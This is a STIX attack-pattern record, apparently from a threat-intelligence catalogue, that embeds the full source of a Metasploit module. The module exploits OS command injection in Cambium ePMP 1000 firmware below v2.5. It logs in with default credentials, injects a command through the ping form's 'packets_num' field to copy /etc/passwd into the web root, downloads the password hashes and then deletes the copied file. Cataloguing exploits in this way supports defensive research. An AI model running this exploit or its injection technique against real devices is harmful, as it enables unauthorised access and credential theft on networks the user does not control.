{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f418663-d4bb-4cf5-93c1-3915077abcde",
    "created": "2024-08-14T16:28:29.25817Z",
    "modified": "2024-08-14T16:28:29.258174Z",
    "name": "\"Cambium ePMP 1000 ping Password Hash Extractor (up to v2.5)\"",
    "description": " This module exploits an OS Command Injection vulnerability in Cambium ePMP 1000 (<v2.5) device management portal. It requires any one of the following login credentials - admin/admin, installer/installer, home/home - to dump system hashes.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/epmp1000_dump_hashes.rb",
            "external_id": "epmp1000_dump_hashes.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::EPMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)\",\n      'Description' => %{\n          This module exploits an OS Command Injection vulnerability in Cambium\n          ePMP 1000 (<v2.5) device management portal. It requires any one of the\n          following login credentials - admin/admin, installer/installer, home/home - to\n          dump system hashes.\n      },\n      'References' =>\n        [\n          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],\n          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']\n        ],\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'License' => MSF_LICENSE\n     )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  def run_host(ip)\n    unless is_app_epmp1000?\n      return\n    end\n  end\n\n  # Command Execution\n  def hash_dump(config_uri, cookie)\n    random_filename = Rex::Text::rand_text_alpha(8)\n    command = 'cp /etc/passwd /www/' + random_filename\n    inject = '|' + \"#{command}\" + ' ||'\n    clean_inject = CGI.unescapeHTML(inject.to_s)\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => config_uri,\n        'cookie' => cookie,\n        'headers' => {\n          'Accept' => '*/*',\n          'Accept-Language' => 'en-US,en;q=0.5',\n          'Accept-Encoding' => 'gzip, deflate',\n          'X-Requested-With' => 'XMLHttpRequest',\n          'ctype' => '*/*',\n          'Connection' => 'close'\n        },\n        'vars_post' =>\n          {\n            'ping_ip' => '127.0.0.1', # This parameter can also be used for injection\n            'packets_num' => clean_inject,\n            'buf_size' => 0,\n            'ttl' => 1,\n            'debug' => '0'\n          }\n      }, 25\n    )\n\n    good_response = (\n      res &&\n      res.code == 200\n    )\n\n    if good_response\n      # retrieve passwd file\n      res = send_request_cgi(\n        {\n          'method' => 'GET',\n          'uri' => '/' + random_filename,\n          'cookie' => cookie,\n          'headers' => {\n            'Accept' => '*/*',\n            'Accept-Language' => 'en-US,en;q=0.5',\n            'Accept-Encoding' => 'gzip, deflate',\n            'X-Requested-With' => 'XMLHttpRequest',\n            'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n            'Connection' => 'close'\n          }\n        }, 25\n      )\n\n      good_response = (\n        res &&\n        res.code == 200 && res.body =~ /root/\n      )\n\n      if good_response\n        print_status(\"#{rhost}:#{rport} - Dumping password hashes\")\n\n        path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')\n        print_status(\"#{rhost}:#{rport} - Hashes saved in: #{path}\")\n\n        # clean up the passwd file from /www/\n        command = 'rm /www/' + random_filename\n        inject = '|' + \"#{command}\" + ' ||'\n        clean_inject = CGI.unescapeHTML(inject.to_s)\n\n        res = send_request_cgi(\n          {\n            'uri' => config_uri,\n            'method' => 'POST',\n            'cookie' => cookie,\n            'headers' => {\n              'Accept' => '*/*',\n              'Accept-Language' => 'en-US,en;q=0.5',\n              'Accept-Encoding' => 'gzip, deflate',\n              'X-Requested-With' => 'XMLHttpRequest',\n              'ctype' => '*/*',\n              'Connection' => 'close'\n            },\n            'vars_post' =>\n              {\n                'ping_ip' => '127.0.0.1', # This parameter can also be used for injection\n                'packets_num' => clean_inject,\n                'buf_size' => 0,\n                'ttl' => 1,\n                'debug' => '0'\n              }\n          }\n        )\n      else\n        check_file_uri = \"#{(ssl ? 'https' : 'http')}\" + '://' + \"#{rhost}:#{rport}\" + '/' + random_filename\n        print_error(\"#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.\")\n      end\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to dump hashes.\")\n    end\n  end\n\n  #\n  # Login & initiate Password Hash dump\n  #\n\n  def do_login(epmp_ver)\n    if epmp_ver < '2.5' # <3.4.1 uses login_1\n      cookie, _blah1, _blah2, _blah3, config_uri_ping = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)\n      if cookie == 'skip' && config_uri_ping == 'skip'\n        return\n      else\n        hash_dump(config_uri_ping, cookie)\n      end\n    else\n      print_error('This ePMP version is not vulnerable. Module will not continue.')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}